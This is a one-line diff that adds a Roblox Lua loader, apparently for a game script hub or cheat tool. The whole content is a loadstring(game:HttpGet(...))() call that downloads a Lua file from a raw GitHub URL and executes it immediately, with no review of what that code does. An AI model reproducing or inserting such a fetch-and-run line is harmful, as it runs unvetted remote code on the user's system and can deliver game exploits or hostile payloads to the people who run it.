@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/BestScriptV2/BestScript/refs/heads/main/LimitLoader-id.lua"))()
